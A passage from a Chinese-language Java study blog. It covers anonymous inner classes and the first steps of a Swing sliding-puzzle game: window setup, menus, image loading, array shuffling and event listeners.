<li>定义一个没有名字的内部类</li>
<li>这个类实现了父类，或者父类接口</li>
<li>匿名内部类会创建这个没有名字的类的对象</li>
</ol>
<h4 id="使用场景"><a class="header-anchor" href="#使用场景">¶</a>使用场景</h4>
<ul>
<li>通常在方法的形式参数是接口或者抽象类时，也可以将匿名内部类作为参数传递</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 普通方式传入对象</span></span><br><span class="line">        <span class="comment">// 创建实现类对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        goSwimming(s);</span><br><span class="line">        <span class="comment">// 匿名内部类使用场景:作为方法参数传递</span></span><br><span class="line">        <span class="type">Swim</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;蝶泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 传入匿名内部类</span></span><br><span class="line">        goSwimming(s3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 完美方案: 一步到位</span></span><br><span class="line">        goSwimming(<span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;大学生, 蛙泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        goSwimming(<span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;小学生, 自由泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个方法,模拟请一些人去游泳</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">goSwimming</span><span class="params">(Swim s)</span> &#123;</span><br><span class="line">        s.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有点没看懂= =</li>
</ul>
<h2 id="Day16-面向对象综合练习（上）-拼图游戏"><a class="header-anchor" href="#Day16-面向对象综合练习（上）-拼图游戏">¶</a>Day16 面向对象综合练习（上）-- 拼图游戏</h2>
<ul>
<li>利用Java的<strong>图形化界面</strong>，写一个项目，知道前面学习的知识点在实际开发中的应用场景</li>
</ul>
<h3 id="实现思路"><a class="header-anchor" href="#实现思路">¶</a>实现思路</h3>
<ul>
<li>先写游戏主界面，实现步骤如下：</li>
</ul>
<ol>
<li>完成最外层窗体的搭建。</li>
<li>再把菜单添加到窗体当中。</li>
<li>把小图片添加到窗体当中。</li>
<li>打乱数字图片的顺序。</li>
<li>让数字图片可以移动起来。</li>
<li>通关之后的胜利判断。</li>
<li>添加其他额外的功能。</li>
</ol>
<h3 id="主界面搭建"><a class="header-anchor" href="#主界面搭建">¶</a>主界面搭建</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建App类，编写main方法，作用: 程序的主入口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 召唤主界面</span></span><br><span class="line"><span class="type">JFrame</span> <span class="variable">jFrame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置主界面的大小</span></span><br><span class="line">jFrame.setSize(<span class="number">514</span>,<span class="number">595</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将主界面设置到屏幕的正中央</span></span><br><span class="line">jFrame.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将主界面置顶</span></span><br><span class="line">jFrame.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭主界面的时候让代码一起停止</span></span><br><span class="line">jFrame.setDefaultCloseOperation(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给主界面设置一个标题</span></span><br><span class="line">jFrame.setTitle(<span class="string">&quot;拼图游戏单机版 v1.0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.让主界面显示出来</span></span><br><span class="line">jFrame.setVisible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>注意事项</strong>：jFrame.setVisible(true);必须要写在最后一行</li>
</ul>
<h3 id="利用继承改进代码"><a class="header-anchor" href="#利用继承改进代码">¶</a>利用继承改进代码</h3>
<ul>
<li>**需求：**如果把所有的代码都写在main方法中，那么main方法里面的代码，就包含游戏主界面的代码，登录界面的代码，注册界面的代码，会变得非常臃肿后期维护也是一件非常难的事情，所以我们需要用继承改进，改进之后，代码就可以分类了</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//登录界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//LoginJFrame 表示登录界面</span></span><br><span class="line">    <span class="comment">//以后所有跟登录相关的代码，都写在这里</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginJFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//在创建登录界面的时候，同时给这个界面去设置一些信息</span></span><br><span class="line">        <span class="comment">//比如，宽高，直接展示出来</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">488</span>,<span class="number">430</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图 登录&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line"> <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//让显示显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//注册界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegisterJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//跟注册相关的代码，都写在这个界面中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RegisterJFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">488</span>,<span class="number">500</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图 注册&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//让显示显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        getContentPane();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏主界面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GameJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">    <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//让界面显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：this表示当前窗体</li>
</ul>
<h3 id="菜单制作"><a class="header-anchor" href="#菜单制作">¶</a>菜单制作</h3>
<ul>
<li>
<p>在菜单中有：JMenuBar、JMenu、JMenuItem</p>
</li>
<li>
<p>其中JMenuBar是整体，一个界面中一般只有一个JMenuBar（顶栏操作栏）。而JMenu是菜单中的选项，可以有多个。JMenuItem是选项下面的条目，也可以有多个</p>
</li>
<li>
<p>代码步骤</p>
<ul>
<li>创建JMenuBar对象</li>
<li>创建JMenu对象</li>
<li>创建JMenuItem对象</li>
<li>把JMenuItem添加到JMenu中</li>
<li>把JMenu添加到JMenuBar中</li>
<li>把整个JMenuBar设置到整个界面中</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个菜单对象</span></span><br><span class="line"><span class="type">JMenuBar</span> <span class="variable">jMenuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"><span class="comment">//设置菜单的宽高</span></span><br><span class="line">jMenuBar.setSize(<span class="number">514</span>, <span class="number">20</span>);</span><br><span class="line"><span class="comment">//创建一个选项</span></span><br><span class="line"><span class="type">JMenu</span> <span class="variable">jMenu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;功能&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个条目</span></span><br><span class="line">jMenuItem1 = <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把条目添加到选项当中</span></span><br><span class="line">jMenu1.add(jMenuItem1);</span><br><span class="line"><span class="comment">//把选项添加到菜单当中</span></span><br><span class="line">jMenuBar.add(jMenu1);</span><br><span class="line"><span class="comment">//把菜单添加到最外层的窗体当中</span></span><br><span class="line"><span class="built_in">this</span>.setJMenuBar(jMenuBar);</span><br></pre></td></tr></table></figure>
<h3 id="添加图片"><a class="header-anchor" href="#添加图片">¶</a>添加图片</h3>
<ul>
<li>
<p>使用到的Java类</p>
<ul>
<li>ImageIcon：描述图片的类，可以关联计算中任意位置的图片。但一般会把图片拷贝到当前项目中。</li>
<li>JLabel：用来管理图片，文字的类。可以用来设置位置，宽高。</li>
</ul>
</li>
<li>
<p>坐标</p>
<ul>
<li>界面左上角的点可以看做是坐标的原点，横向的是X轴，纵向的是Y轴。</li>
<li>图片的位置其实取决于图片左上角的点，在坐标中的位置。</li>
<li>如果是（0,0）那么该图片会显示在屏幕的左上角</li>
</ul>
</li>
<li>
<p>步骤</p>
</li>
</ul>
<ol>
<li>取消整个界面的默认居中布局</li>
<li>创建ImageIcon对象，并制定图片位置。</li>
<li>创建JLabel对象，并把ImageIcon对象放到小括号中。</li>
<li>利用JLabel对象设置大小，宽高。</li>
<li>将JLabel对象添加到整个界面当中。</li>
</ol>
<h4 id="打乱图片的位置"><a class="header-anchor" href="#打乱图片的位置">¶</a>打乱图片的位置</h4>
<ul>
<li>每一张图片都对应1~15之间的数字，空白处为0，打乱图片实际上就是把数字打乱，添加图片的时候按照打乱的图片添加即可</li>
</ul>
<h5 id="预先练习：打乱数组中的数据"><a class="header-anchor" href="#预先练习：打乱数组中的数据">¶</a>预先练习：打乱数组中的数据</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求：</span></span><br><span class="line">        <span class="comment">//把一个一维数组中的数据：0~15 打乱顺序</span></span><br><span class="line">        <span class="comment">//然后再按照4个一组的方式添加到二维数组当中</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//1.定义一个一维数组</span></span><br><span class="line">        <span class="type">int</span>[] tempArr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2.打乱数组中的数据的顺序</span></span><br><span class="line">        <span class="comment">//遍历数组，得到每一个元素，拿着每一个元素跟随机索引上的数据进行交换</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//获取到随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(tempArr.length);</span><br><span class="line">            <span class="comment">//拿着遍历到的每一个数据，跟随机索引上的数据进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> tempArr[i];</span><br><span class="line">            tempArr[i] = tempArr[index];</span><br><span class="line">            tempArr[index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            System.out.print(tempArr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4.创建一个二维数组</span></span><br><span class="line">        <span class="type">int</span>[][] data = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//5.给二维数组添加数据</span></span><br><span class="line">        <span class="comment">//解法一：</span></span><br><span class="line">        <span class="comment">//遍历一维数组tempArr得到每一个元素，把每一个元素依次添加到二维数组当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            data[i / <span class="number">4</span>][i % <span class="number">4</span>] = tempArr[i];  <span class="comment">// 这行妙啊</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历二维数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; data[i].length; j++) &#123;</span><br><span class="line">                System.out.print(data[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="打乱图片"><a class="header-anchor" href="#打乱图片">¶</a>打乱图片</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打乱图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">//JFrame 界面，窗体</span></span><br><span class="line">    <span class="comment">//子类呢？也表示界面，窗体</span></span><br><span class="line">    <span class="comment">//规定：GameJFrame这个界面表示的就是游戏的主界面</span></span><br><span class="line">    <span class="comment">//以后跟游戏相关的所有逻辑都写在这个类中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个二维数组</span></span><br><span class="line">    <span class="comment">//目的：用来管理数据</span></span><br><span class="line">    <span class="comment">//加载图片的时候，会根据二维数组中的数据进行加载</span></span><br><span class="line">    <span class="type">int</span>[][] data = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GameJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//初始化界面</span></span><br><span class="line">        initJFrame();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化菜单</span></span><br><span class="line">        initJMenuBar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">        initData();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化图片（根据打乱之后的结果去加载图片）</span></span><br><span class="line">        initImage();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//让界面显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个一维数组</span></span><br><span class="line">        <span class="type">int</span>[] tempArr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2.打乱数组中的数据的顺序</span></span><br><span class="line">        <span class="comment">//遍历数组，得到每一个元素，拿着每一个元素跟随机索引上的数据进行交换</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//获取到随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(tempArr.length);</span><br><span class="line">            <span class="comment">//拿着遍历到的每一个数据，跟随机索引上的数据进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> tempArr[i];</span><br><span class="line">            tempArr[i] = tempArr[index];</span><br><span class="line">            tempArr[index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.给二维数组添加数据</span></span><br><span class="line">        <span class="comment">//遍历一维数组tempArr得到每一个元素，把每一个元素依次添加到二维数组当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            data[i / <span class="number">4</span>][i % <span class="number">4</span>] = tempArr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化图片</span></span><br><span class="line">    <span class="comment">//添加图片的时候，就需要按照二维数组中管理的数据添加图片</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initImage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//外循环 --- 把内循环重复执行了4次。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">                <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">                <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;C:\\Users\\moon\\IdeaProjects\\basic-code\\puzzlegame\\image\\animal\\animal3\\&quot;</span> + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">                <span class="comment">//指定图片位置</span></span><br><span class="line">                jLabel.setBounds(<span class="number">105</span> * j, <span class="number">105</span> * i, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">                <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">                <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJMenuBar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//创建整个的菜单对象</span></span><br><span class="line">        <span class="type">JMenuBar</span> <span class="variable">jMenuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建菜单上面的两个选项的对象 （功能  关于我们）</span></span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">functionJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;功能&quot;</span>);</span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">aboutJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;关于我们&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建选项下面的条目对象</span></span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">replayItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">reLoginItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新登录&quot;</span>);</span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">closeItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;关闭游戏&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">JMenuItem</span> <span class="variable">accountItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;公众号&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将每一个选项下面的条目天极爱到选项当中</span></span><br><span class="line">        functionJMenu.add(replayItem);</span><br><span class="line">        functionJMenu.add(reLoginItem);</span><br><span class="line">        functionJMenu.add(closeItem);</span><br><span class="line">        </span><br><span class="line">        aboutJMenu.add(accountItem);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将菜单里面的两个选项添加到菜单当中</span></span><br><span class="line">        jMenuBar.add(functionJMenu);</span><br><span class="line">        jMenuBar.add(aboutJMenu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给整个界面设置菜单</span></span><br><span class="line">        <span class="built_in">this</span>.setJMenuBar(jMenuBar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="事件"><a class="header-anchor" href="#事件">¶</a>事件</h3>
<ul>
<li>事件是可以被组件识别的操作</li>
</ul>
<h4 id="事件的三个核心要素"><a class="header-anchor" href="#事件的三个核心要素">¶</a>事件的三个核心要素</h4>
<ul>
<li>事件源：按钮  图片  窗体</li>
<li>事件：某些曹组</li>
<li>绑定监听：当事件源上发生了某个时间，则执行某段代码‘</li>
</ul>
<h4 id="常见三种事件监听"><a class="header-anchor" href="#常见三种事件监听">¶</a>常见三种事件监听</h4>
<ul>
<li>键盘监听 KeyListener</li>
<li>⿏标监听 MouseListener</li>
<li>动作监听 ActionListener</li>
</ul>
<h4 id="事件监听"><a class="header-anchor" href="#事件监听">¶</a>事件监听</h4>
<ul>
<li>包含：
<ul>
<li>鼠标左键点击</li>
<li>空格</li>
</ul>
</li>
</ul>
<h5 id="事件的三种实现方式"><a class="header-anchor" href="#事件的三种实现方式">¶</a>事件的三种实现方式</h5>
<ul>
<li>定义实现类实现接口</li>
<li>匿名内部类</li>
<li>本类实现接口</li>
</ul>
<h6 id="方式一：实现类"><a class="header-anchor" href="#方式一：实现类">¶</a>方式一：实现类</h6>
<ul>
<li>定义实现类实现ActionListener接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">jFrame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>();</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        jFrame.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        jFrame.setTitle(<span class="string">&quot;事件演示&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        jFrame.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        jFrame.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        